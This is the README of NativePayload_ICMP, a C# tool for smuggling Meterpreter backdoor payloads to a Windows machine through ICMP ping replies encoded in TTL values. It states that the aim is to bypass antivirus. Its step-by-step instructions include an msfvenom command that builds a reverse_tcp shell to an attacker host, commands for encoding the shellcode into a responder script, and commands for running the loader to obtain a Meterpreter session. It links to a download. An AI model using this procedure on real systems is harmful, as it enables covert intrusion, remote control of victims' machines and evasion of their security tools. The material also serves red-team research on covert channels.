# NativePayload_ICMP v1.0
C# code Published by Damon Mohammadbagher

Article step by step : https://www.peerlyst.com/posts/transfer-download-payload-by-icmpv4-traffic-via-ttl-damon-mohammadbagher


NativePayload_ICMP : transfer Backdoor Payloads by ICMPv4 Traffic and bypassing Anti-Viruses

Tested : Win7 SP1 and Win 2008 R2

step by step:

example step1 msfvenom --arch x86_64 --platform windows -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.50 -f c > payload.txt

note: copy your msfvenom output payloads to 'Payload string' like 'fc4883e4f0e8cc00000415141505265'

example step2 c:\\> NativePayload_ICMP.exe null "Payload string" > script.sh

example step2 c:\\> NativePayload_ICMP.exe null fc4883e4f0e8cc00000415141505265 > script.sh

example step3 c:\\> NativePayload_ICMP.exe ipaddress (sending ICMPv4 traffic to this ipaddress by ping)

example step3 c:\\> NativePayload_ICMP.exe 192.168.1.50 

example step4 linux side ./script.sh  (run this script in PING Responder linux system).

note: after chmod also adding #!/bin/bash to script.sh file , you can run this script in PING Responder system.

note: you should run this script in your linux after step3 for Response to PING traffic from backdoor system

note: Backdoor system is win with NativePayload_ICMP.exe and ipaddress for example: 192.168.1.120

note: PING Responder system is linux with ./script.sh and ipaddress for example : 192.168.1.50

note: PING Responder system is also Meterpreter Listener by ipaddress : 192.168.1.50

<summary>

in this case after 1020 ping request and response you have Meterpreter Session by ICMPv4

Dumping Payloads by TTL from PING Response...

Meterpreter Payload is 510 bytes

510 * 2 = 1020

 0 ... 1019 = 1020 Request
 
</summary>

# NativePayload_ICMP v2.0

"NativePayload_ICMP.exe" v2.0 C# Code and Shell Script "NativePayload_ICMP.sh" v1.0 Released for Ebook. (May 2018 , bug fixed).

    NativePayload_ICMP.exe v2.0 syntax: 
    NativePayload_ICMP.exe help

    NativePayload_ICMP.sh v1.0 syntax: 
    step0 Client-Side with ipv4 w.x.y.z , syntax :./NativePayload_ICMP.sh shtext "your text or string"
    step1 Server-Side with ipv4 w1.x1.y1.z1 syntax :./NativePayload_ICMP.sh listen "w.x.y.z"
    Note: in step1 you should use Client-side system w.x.y.z IPv4Address
    help syntax : ./NativePayload_ICMP.sh help

Download  "NativePayload_ICMP.exe" v2.0 C# Code and Shell Script "NativePayload_ICMP.sh" v1.0 here : https://github.com/DamonMohammadbagher/NativePayload_ICMP/tree/master/EBOOK
